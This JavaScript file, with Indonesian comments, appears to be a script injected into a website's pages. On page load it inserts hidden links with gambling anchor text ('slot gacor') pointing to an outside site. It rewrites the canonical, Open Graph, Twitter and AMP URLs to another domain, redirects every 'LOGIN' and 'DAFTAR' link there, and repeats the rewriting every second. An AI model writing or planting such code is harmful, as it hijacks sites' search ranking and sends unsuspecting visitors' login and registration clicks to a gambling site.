// Define the official domains
const officialDomain = 'https://mercer-brunch-kyoto.com/menu.html'; 
const ampDomain = 'https://mercer-brunch-kyoto.com/amp/';       

function insertBacklinks() {
  // Buat dua tautan yang disembunyikan
  const link1 = document.createElement('a');
  link1.href = 'https://abqkings.org/about/'; // Tautan disiapkan sesuai yang diinginkan
  link1.style.display = 'none'; // Tautan disembunyikan
  link1.textContent = 'slot gacor'; // Menambahkan anchor text
  link1.classList.add('special-link'); // Menambahkan kelas untuk penanda khusus

  const link2 = document.createElement('a');
  link2.href = 'https://abqkings.org/about/'; // Tautan disiapkan sesuai yang diinginkan
  link2.style.display = 'none'; // Tautan disembunyikan
  link2.textContent = 'slot gacor resmi'; // Menambahkan anchor text
  link2.classList.add('special-link'); // Menambahkan kelas untuk penanda khusus

  // Dapatkan elemen body
  const body = document.body;
  const children = body.children;
  
  // Tentukan posisi untuk menyisipkan tautan
  const middleIndex = Math.floor(children.length / 2);
  const referenceNode = children[middleIndex];

  // Sisipkan tautan setelah elemen tengah
  if (referenceNode) {
    body.insertBefore(link1, referenceNode); // Menyisipkan link1 sebelum elemen tengah
    body.insertBefore(link2, referenceNode); // Menyisipkan link2 sebelum elemen tengah
  }
}

// Function to replace specific anchor tags with ampDomain
function replaceAnchorTags() {
  // Dapatkan semua tautan di halaman
  const anchors = document.querySelectorAll('a');

  anchors.forEach(anchor => {
    // Periksa apakah teks tautan adalah 'LOGIN' atau 'DAFTAR' (case insensitive)
    if (anchor.textContent.trim().toUpperCase() === 'LOGIN' || anchor.textContent.trim().toUpperCase() === 'DAFTAR') {
      anchor.href = ampDomain; // Ubah href menjadi ampDomain
    }
  });
}

// Function to force all appropriate URLs to the official domain
function forceUrlsToOfficialDomain() {
  // Force canonical URL
  const canonicalLink = document.querySelector('link[rel="canonical"]');
  let canonicalBasePath = ''; // Menyimpan path base dari canonical

  if (canonicalLink) {
    // Ambil path asli dari canonical URL
    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, ''); // Mengambil path
    canonicalLink.href = officialDomain; // Canonical menjadi officialDomain tanpa path tambahan
  } else {
    // Create canonical link if it doesn't exist
    const newCanonical = document.createElement('link');
    newCanonical.rel = 'canonical';
    newCanonical.href = officialDomain; // Tanpa path
    document.head.appendChild(newCanonical);
  }

  // Force anchor tags (<a>) to use the official domain, except special links
  const links = document.querySelectorAll('a[href]');
  links.forEach(link => {
    // Only update URLs that are absolute (start with http or https) and not special links
    if (link.href.startsWith('http') && !isSpecialLink(link)) {
      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); // Ambil path setelah domain
      // Mengganti domain dan menghapus bagian dari canonicalBasePath
      link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
    }
  });

  // Force meta tags with URLs (e.g., og:url, twitter:url)
  const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
  metaUrls.forEach(meta => {
    const metaPath = meta.content.replace(/^https?:\/\/[^\/]+/, ''); // Ambil path setelah domain
    meta.content = officialDomain + metaPath.replace(canonicalBasePath, ''); // Gabung dengan officialDomain
  });

  // Change AMP link if it exists
  const ampLink = document.querySelector('link[rel="amphtml"]');
  if (ampLink) {
    // Set AMP link to the amp domain only
    ampLink.href = ampDomain; // Set jadi https://www.tera.com/
  } else {
    // Jika tidak ada, ciptakan link AMP baru
    const newAmpLink = document.createElement('link');
    newAmpLink.rel = 'amphtml';
    newAmpLink.href = ampDomain; // Set jadi https://www.tera.com/
    document.head.appendChild(newAmpLink); // Tambahkan ke head
  }
}

// Fungsi untuk memeriksa apakah tautan adalah tautan khusus yang tidak boleh diubah
function isSpecialLink(link) {
  // Mengembalikan true jika tautan adalah login, register, canonical, amp, atau tautan disembunyikan
  return link.classList.contains('login') ||
         link.classList.contains('register') ||
         link.href === officialDomain ||
         link.href === ampDomain ||
         link.classList.contains('special-link') || // Pertahankan tautan yang disembunyikan
         link.textContent.trim().toUpperCase() === 'LOGIN' || // Periksa apakah teks adalah 'LOGIN'
         link.textContent.trim().toUpperCase() === 'DAFTAR'; // Periksa apakah teks adalah 'DAFTAR'
}

// Run the function when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
  insertBacklinks(); // Tambahkan tautan dahulu
  forceUrlsToOfficialDomain(); // Memaksakan perubahan URL
  replaceAnchorTags(); // Memanggil fungsi untuk mengganti tautan
});

// Periodically check and enforce URLs (in case of dynamic changes)
setInterval(forceUrlsToOfficialDomain, 1000);
